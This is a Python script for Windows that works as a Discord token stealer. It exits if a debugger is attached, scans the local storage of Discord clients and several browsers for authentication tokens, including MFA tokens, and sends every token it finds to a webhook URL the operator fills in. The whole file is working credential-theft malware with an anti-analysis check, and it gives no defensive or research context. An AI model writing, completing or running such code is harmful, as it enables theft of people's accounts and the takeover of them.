import os
if os.name != "nt": exit()
import json
import re
import sys
import urllib3
from ctypes import *
import requests
from urllib.request import Request, urlopen
import tkinter
from tkinter import *


WEBHOOK_URL = ''




def checknet():
    url = "https://www.google.com/"
    timeout = 5
    try:
        request = requests.get(url, timeout=timeout)
    except (requests.ConnectionError, requests.Timeout) as exception:
        print("No internet connection. Fuck off...")
        sys.exit()

def check():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
    if(isDebuggerPresent):
        sys.exit(0)
    else:
        pass


def GetTheTokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord' ,
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Brave" : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = []
        for file_name in os.listdir(path + ldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        if len(tokens) > 0:
            grabbed[platform] = tokens
    return grabbed

def Sending(webhook_url, tokens_grabbed = None):
    checknet()
    check()
    if not tokens_grabbed: tokens_grabbed = GetTheTokens()
    embed = [{'description' : ''}]
    for app in list(tokens_grabbed.keys()):
        embed[0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n```'

    urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
    import skidder

Sending(WEBHOOK_URL)